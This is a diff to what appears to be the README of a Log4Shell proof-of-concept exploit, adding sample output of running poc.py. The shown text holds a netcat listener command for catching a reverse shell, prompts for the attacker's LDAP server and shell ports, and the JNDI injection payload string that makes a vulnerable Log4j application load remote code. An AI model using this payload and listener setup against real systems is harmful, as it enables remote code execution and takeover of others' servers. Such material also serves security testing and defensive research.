@@ -26,6 +26,17 @@ nc -lvnp 9001
 **Note:** For this to work, the extracted java archive has to be named: `jdk1.8.0_20`, and be in the same directory.
 ```py
 python3 poc.py
+java version "1.8.0_20"
+Java(TM) SE Runtime Environment (build 1.8.0_20-b26)
+Java HotSpot(TM) 64-Bit Server VM (build 25.20-b23, mixed mode)
+
+
+[+] Enter IP for LDAPRefServer & Shell: localhost
+[+] Enter listener port for LDAPRefServer: 80
+[+] Set listener port for shell: 9001
+[+] Send me: ${jndi:ldap://localhost:1389/a}
+
+Listening on 0.0.0.0:1389
 ```
 
 <br>
